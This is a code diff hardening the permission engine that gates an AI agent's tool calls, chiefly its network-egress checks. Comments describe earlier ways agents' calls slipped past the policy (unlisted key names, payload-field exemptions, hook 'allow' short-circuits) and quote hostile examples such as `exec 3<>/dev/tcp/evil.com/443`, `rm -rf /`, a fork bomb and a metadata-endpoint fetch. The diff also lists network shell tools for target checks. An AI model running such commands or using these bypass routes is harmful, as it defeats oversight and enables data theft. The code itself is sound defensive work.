@@ -25,7 +25,7 @@ from engine.hooks.events import HookEvent
 
 from .decision import Behavior, Decision, allow, ask, deny
 from .modes import MODE_DEFAULTS, Mode
-from .network import NetworkPolicy, extract_host, is_reserved_ip
+from .network import NetworkPolicy, extract_host, is_internal_target
 from .rule import parse_rule, rule_matches
 
 
@@ -41,6 +41,12 @@ _NETWORK_TARGET_KEYS = (
     "url", "uri", "link", "target", "targets", "host", "hosts", "hostname",
     "domain", "domains", "endpoint", "addr", "address", "base_url", "callback",
     "redirect_uri", "proxy", "urls", "ip", "webhook", "origin", "server", "upstream",
+    # Names a destination without containing one of the fragments below. A bare hostname
+    # under one of these (`{"destination": "evil.com"}`) produced NO target at all, because
+    # only an absolute `scheme://` URL was recognised under an unlisted key.
+    "destination", "dest", "remote", "peer", "node", "broker", "bootstrap", "cluster",
+    "sink", "forward", "forward_to", "relay", "collector", "receiver", "nameserver",
+    "resolver", "registry", "mirror", "gateway", "backend",
 )
 # A key is also a destination if its NAME contains one of these fragments, so a custom tool
 # field (`webhook_url`, `callbackUri`, `api_endpoint`, `targetHost`) is checked too. Exact-
@@ -56,6 +62,8 @@ def _is_network_key(key: str) -> bool:
     return k in _NETWORK_TARGET_KEYS or any(f in k for f in _NETWORK_KEY_FRAGMENTS)
 _URL_RE = re.compile(r"[a-zA-Z][a-zA-Z0-9+.-]*://[^\s\"'<>|\\]+")
 _HOSTLIKE_RE = re.compile(r"^(?!-)(?:[A-Za-z0-9_-]+\.)+[A-Za-z0-9_-]+(?::\d+)?$")
+# Bash pseudo-device sockets: /dev/tcp/HOST/PORT and /dev/udp/HOST/PORT.
+_DEV_TCP_RE = re.compile(r"/dev/(?:tcp|udp)/([^/\s'\"]+)/(\d+)")
 # Shell binaries that take a host/URL as an argument, so `curl http://x` is target-checked.
 _NET_BINARIES = {
     "curl", "wget", "nc", "ncat", "netcat", "telnet", "ssh", "scp", "ftp", "sftp",
@@ -74,10 +82,97 @@ def _iter_strings(v) -> Iterable[str]:
             yield from _iter_strings(x)
 
 
+# Keys whose value is a PAYLOAD the agent sends, not a host it dials. A URL inside a
+# request body is data being transmitted; flagging it as a destination would deny sending
+# a link to an allow-listed API.
+_PAYLOAD_KEYS = frozenset({
+    "body", "data", "content", "payload", "text", "message", "prompt", "input",
+    "value", "query", "sql", "json", "form", "note", "description", "comment",
+})
+
+
+def _names_a_destination(value, depth: int = 0) -> bool:
+    """True if this argument tree names a destination through a RECOGNISED key.
+
+    Decides whether the payload exemption below is safe to apply. A URL inside a request
+    body is data being sent TO a destination — but only if a destination was named. When
+    nothing else in the call is a destination, a URL under `query`/`data`/`input` is not a
+    payload accompanying a request, it IS the request's target.
+    """
+    if depth > _MAX_WALK_DEPTH:
+        return False
+    if isinstance(value, dict):
+        for k, sub in value.items():
+            if _is_network_key(str(k).lower()) and any(
+                s.strip() for s in _iter_strings(sub)
+            ):
+                return True
+            if _names_a_destination(sub, depth + 1):
+                return True
+    elif isinstance(value, (list, tuple)):
+        return any(_names_a_destination(item, depth + 1) for item in value)
+    return False
+
+
+# Nesting deeper than this is not walked. It was 6, and list elements consume depth, so a
+# URL inside a list-of-dicts escaped at a shallower nesting than a plain dict would.
+_MAX_WALK_DEPTH = 12
+
+
+def _walk_targets(
+    value, key: str = "", depth: int = 0, *, exempt_payload: bool = True
+) -> Iterable[str]:
+    """Yield every destination named anywhere in a tool's arguments.
+
+    Two independent signals, because either alone leaks:
+
+      * the KEY names a destination (`url`, `webhook_url`, `callbackUri`, `targetHost`) —
+        at ANY depth. Only top-level keys used to be inspected, so a URL one level down in
+        `{"payload": {"nested": {"url": ...}}}` was invisible to the network policy.
+      * the VALUE is an absolute http(s) URL under a key that is not a payload field. Key
+        matching alone meant a field called `destination`, `to`, `where` or `cmd` — none of
+        which contain one of the nine magic substrings — carried a URL straight past the
+        allowlist. The whole policy hinged on the tool author's choice of noun.
+
+    Payload keys are excluded so a URL being SENT somewhere is not mistaken for a host
+    being dialled.
+    """
+    if depth > _MAX_WALK_DEPTH:
+        return
+    k = str(key).lower()
+    if isinstance(value, str):
+        s = value.strip()
+        if not s:
+            return
+        if _is_network_key(k):
+            yield s
+        elif _URL_RE.fullmatch(s) and not (exempt_payload and k in _PAYLOAD_KEYS):
+            yield s
+        return
+    if isinstance(value, dict):
+        for sub_key, sub in value.items():
+            # A destination key holding a structure means every string under it is a target.
+            if _is_network_key(str(sub_key).lower()):
+                for s in _iter_strings(sub):
+                    if s.strip():
+                        yield s.strip()
+            else:
+                yield from _walk_targets(
+                    sub, sub_key, depth + 1, exempt_payload=exempt_payload
+                )
+        return
+    if isinstance(value, (list, tuple)):
+        for item in value:
+            yield from _walk_targets(item, key, depth + 1, exempt_payload=exempt_payload)
+
+
 def _hosts_from_command(cmd: str) -> list[str]:
     """Destinations named in a shell command: any URL, plus the first non-flag arg to a
     known network binary (`curl example.com`, `nc host 4444`)."""
     out = [m.group(0) for m in _URL_RE.finditer(cmd)]
+    # Bash's /dev/tcp/host/port opens a socket with no binary and no URL, so neither test
+    # above saw it — `exec 3<>/dev/tcp/evil.com/443` was a silent egress channel.
+    out.extend(f"{h}:{p}" for h, p in _DEV_TCP_RE.findall(cmd))
     toks = cmd.split()
     for i, t in enumerate(toks):
         base = t.rsplit("/", 1)[-1].rsplit("\\", 1)[-1].lower()
@@ -98,12 +193,23 @@ def network_targets(call: ToolCall) -> list[str]:
     merely appears inside a request body is a payload sent TO a target, not a host the
     engine itself dials, so it is not treated as a destination.
     """
+    from .danger import command_text, is_shell_call  # lazy: import cycle
+
     out: list[str] = []
-    if call.name.lower() in ("bash", "shell", "powershell"):
-        out.extend(_hosts_from_command(str(call.input.get("command", ""))))
-    for k, v in call.input.items():
-        if _is_network_key(str(k)):
-            out.extend(s for s in _iter_strings(v) if s.strip())
+    if is_shell_call(call):
+        # Any command-execution tool, not just one literally named `bash` — same fail-open
+        # naming coupling the danger checks had.
+        out.extend(_hosts_from_command(command_text(call)))
+    # The payload exemption is CONDITIONAL. It exists so a URL inside a request body is not
+    # mistaken for a host being dialled — which is right only when the call names a
+    # destination somewhere else. Applied unconditionally it was a fail-open bypass: a tool
+    # whose destination parameter happened to be called `query`, `data`, `input`, `json`,
+    # `form`, `content`, `payload`, `text`, `message`, `prompt`, `sql`, `note`,
+    # `description` or `comment` had NO target extracted, so the network policy never saw
+    # it. Exactly the "depends on the tool author's choice of noun" failure the key-matching
+    # rules were written to remove, in the opposite direction.
+    exempt = _names_a_destination(call.input)
+    out.extend(_walk_targets(call.input, exempt_payload=exempt))
     seen: set[str] = set()
     uniq: list[str] = []
     for t in out:
@@ -114,17 +220,15 @@ def network_targets(call: ToolCall) -> list[str]:
 
 
 def _target_is_reserved_ip(target: str) -> bool:
-    """True only if `target`'s host is a RAW reserved/internal IP literal. A hostname is
-    not reserved here: so `network_ask` can let a human approve a public host, while a
-    raw internal address (SSRF/metadata) stays hard-denied."""
-    host = extract_host(target)
-    try:
-        import ipaddress
+    """True if `target` names an internal endpoint, in any spelling.
 
-        ipaddress.ip_address(host)
-    except ValueError:
-        return False
-    return is_reserved_ip(host)
+    `network_ask` lets a human approve an unlisted PUBLIC host; an internal endpoint must
+    stay hard-denied, so it must never be approvable. That means recognising it however it
+    is written — decimal, hex, octal and short-form literals all resolve to loopback, and
+    `localhost` / `metadata.google.internal` are names for the same targets. Matching only
+    canonical dotted-quad literals left every one of those approvable.
+    """
+    return is_internal_target(extract_host(target))
 
 
 def network_target(call: ToolCall) -> Optional[str]:
@@ -135,8 +239,13 @@ def network_target(call: ToolCall) -> Optional[str]:
 
 def match_content(call: ToolCall) -> str:
     """String matched by permission-rule / hook `if` patterns."""
-    if call.name.lower() in ("bash", "shell", "powershell"):
-        return str(call.input.get("command", ""))
+    from .danger import command_text, is_shell_call  # lazy: import cycle
+
+    if is_shell_call(call):
+        # Any command-execution tool, however it is named. Matching only `bash`/`shell`/
+        # `powershell` meant a rule like `Deny: RunCommand(rm *)` matched against the wrong
+        # string entirely.
+        return command_text(call)
     tgt = network_target(call)
     return tgt if tgt is not None else " ".join(str(v) for v in call.input.values())
 
@@ -201,17 +310,24 @@ class PermissionEngine:
         """Hook -> HARD-danger DENY -> network -> rules -> SOFT-danger ASK. Returns a
         terminal Decision, or None to fall through to the classifier / mode-default step.
 
-        Order is deliberate: catastrophic commands are HARD-denied BEFORE the network
-        check and any rule, so an explicit allow rule can never open a path to `rm -rf /`.
-        Dangerous-but-legit commands are SOFT-asked AFTER rules, so an operator who
-        explicitly allow-rules such a command still gets it.
+        Order is deliberate, and asymmetric on purpose:
+
+        * A hook DENY is terminal immediately — the strictest verdict always wins fastest.
+        * A hook ALLOW is held, not obeyed. It suppresses the *discretionary* stages
+          (rules, soft-danger, classifier, mode default) but it does NOT survive the two
+          NON-OVERRIDABLE stages below it: hard-danger and the network policy. A hook that
+          returned `allow()` used to short-circuit the whole pipeline, so `rm -rf /`,
+          `mkfs`, a fork bomb and a fetch of 169.254.169.254 were all permitted in LOCKED
+          mode with an allowlist configured. A control that anything upstream can switch
+          off is not a control.
+        * A hook ASK is likewise held, and can still be escalated to DENY below.
 
         `gate_done` lets the async path run the PreToolUse hooks off the event loop and
         hand the result in, instead of firing them again here.
         """
         if not gate_done:
             gate = self.hooks.gate(self._gate_input(call, content))
-        if gate is not None:
+        if gate is not None and gate.behavior is Behavior.DENY:
             return gate
 
         danger = self._danger_check(call)
@@ -225,6 +341,10 @@ class PermissionEngine:
                     if self.network_ask and not _target_is_reserved_ip(tgt):
                         return ask("network", f"host needs approval: {verdict.reason}")
                     return deny("network", f"blocked: {verdict.reason}", verdict.matched)
+
+        # Past the non-overridable stages, an explicit hook verdict decides.
+        if gate is not None:
+            return gate
 
         for r in self._deny:
             if rule_matches(r, call.name, content):
